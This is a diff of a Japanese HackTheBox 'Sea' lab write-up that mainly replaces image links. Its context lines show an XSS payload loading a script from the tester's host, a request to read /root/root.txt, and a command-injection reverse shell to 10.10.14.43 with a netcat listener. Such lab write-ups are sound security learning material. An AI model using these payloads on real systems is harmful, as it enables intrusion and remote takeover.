@@ -53,7 +53,7 @@ dirbuster
 - 404だけどhome気になるな
 - `http://sea.htb/how-to-participate`の中に、`http://sea.htb/contact.php`があった
 - `http://sea.htb/contact.php`の画像
-- ![[スクリーンショット 2024-12-28 21.07.49.png]]
+- ![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-28%2021.07.49.png)
 ```bash
 [12:58:44] Starting: 
 [12:59:04] 301 -  228B  - /data  ->  http://sea.htb/data/
@@ -217,7 +217,7 @@ http://sea.htb/index.php?page=LoginURL"></form><script+src="http://10.10.14.43:8
 	    - フォーム構造を再度挿入してページの動作を維持する。
 
 `http://sea.htb/contact.php`のwebsiteの欄にXSSを仕掛ける
-![[スクリーンショット 2024-12-28 22.28.18.png]]
+![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-28%2022.28.18.png)
 
 3. xss.jsを管理者が実行する。
 4. xss.jsが実行され、リバースシェルが実行される。
@@ -351,12 +351,12 @@ SSHポートフォワーディングして、接続する。
 ```bash
 ssh -L 8888:localhost:8080 amay@sea.htb
 ```
-![[スクリーンショット 2024-12-29 0.01.13.png]]
+![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-29%200.01.13.png)
 
 
 `log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=`を`%2root%2root.txt`に変更したとき
 うまくいかない
-![[スクリーンショット 2024-12-29 0.08.00.png]]
+![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%B3%E3%82%B7%E3%83%A7%E3%83%83%E3%83%88%202024-12-29%200.08.00.png)
 
 
 
@@ -364,7 +364,7 @@ ssh -L 8888:localhost:8080 amay@sea.htb
 `;bash -c 'bash -i >& /dev/tcp/10.10.14.43/1234 0>&1'`を追加した。
  - `;sh -i >& /dev/tcp/10.10.14.43/1234 0>&1`だと上手くいかなかった
 	 - `bash -c` を使用すると、コマンドを明示的に `bash` シェルで実行するため、`>&` の構文を確実に解釈してくれるから？`
-![[Pasted image 20241229002901.png]]
+![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/Sea/images/Pasted%20image%2020241229002901.png)
 
 ```bash
 └──╼ [★]$ sudo nc -lvnp 1234
